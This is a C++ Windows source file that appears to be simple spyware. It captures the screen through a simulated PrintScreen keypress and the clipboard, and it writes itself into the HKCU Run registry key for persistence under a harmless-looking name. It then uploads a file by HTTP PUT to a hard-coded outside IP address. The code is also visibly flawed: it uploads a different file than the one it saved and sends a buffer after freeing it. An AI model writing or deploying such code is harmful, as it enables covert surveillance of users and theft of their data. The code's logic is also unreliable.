#include <httplib.h>
#include <iostream>
#include <windows.h>
#include <fstream>
#include<vector>
#include <cstdlib>
#include <sstream>
#include <string>
using namespace std;
#include <atlimage.h>
#include <Lmcons.h>
void TakeScreenShot(const std::string& path)
{
	//setting to the screen shot
	keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
	keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);

	//handler of the bitmap that save the screen shot
	HBITMAP hBitmap;

	//I have to give for it time to make it work
	Sleep(100);

	//take the screen shot
	OpenClipboard(NULL);

	//save the screen shot in the bitmap handler 
	hBitmap = (HBITMAP)GetClipboardData(CF_BITMAP);

	//relese the screen shot
	CloseClipboard();

	std::vector<BYTE> buf;
	IStream* stream = NULL;
	HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
	CImage image;
	ULARGE_INTEGER liSize;

	// screenshot to jpg and save to stream
	image.Attach(hBitmap);
	image.Save(stream, Gdiplus::ImageFormatJPEG);
	IStream_Size(stream, &liSize);
	DWORD len = liSize.LowPart;
	IStream_Reset(stream);
	buf.resize(len);
	IStream_Read(stream, &buf[0], len);
	stream->Release();

	// put the imapge in the file
	std::fstream fi;
	fi.open(path, std::fstream::binary | std::fstream::out);
	fi.write(reinterpret_cast<const char*>(&buf[0]), buf.size() * sizeof(BYTE));
	fi.close();

}

const std::string load_assets(const std::string& path) {

	std::ifstream file(path.c_str(), std::ios::in);

	std::stringstream stream;

	stream << file.rdbuf();

	file.close();

	std::string assets(stream.str());

	return assets;
}

void setStartupLaunch() {
	HKEY hKey;
	const char* czStartName = "MyApplication";
	const char* czExePath = "C:\\Users\\fuatf\\Desktop\\helloworld.exe";

	LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, KEY_WRITE,
		&hKey);
	if (ERROR_SUCCESS == lnRes)
	{
		lnRes = RegSetValueEx(hKey,
			czStartName,
			0,
			REG_SZ,
			(unsigned char*)czExePath,
			strlen(czExePath));
	}

	RegCloseKey(hKey);
}

void uploadtoserver(string pathu) {

	//std::string index = load_assets(pathu);
	std::string index = "asfd";

	FILE* f = fopen("a.jpg", "r");

	// Determine file size
	fseek(f, 0, SEEK_END);
	size_t size = ftell(f);
	char* where = new char[size];
	rewind(f);
	fread(where, sizeof(char), size, f);
	std::cout << where;
	delete[] where;
	httplib::Client cli("206.189.99.99", 8000, 5); // timeouts in 5 seconds
	auto res = cli.Put("/a.jpg", where, "file");/////////////////////////////-------------------
}

int main()
{

	char username[UNLEN + 1];//get user name
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	string path = ("C:\\Users\\" + (string)username + "\\AppData\\Local\\Temp\\testt.bmp");

	TakeScreenShot(path);

	setStartupLaunch();

	uploadtoserver(path);

	return 0;
}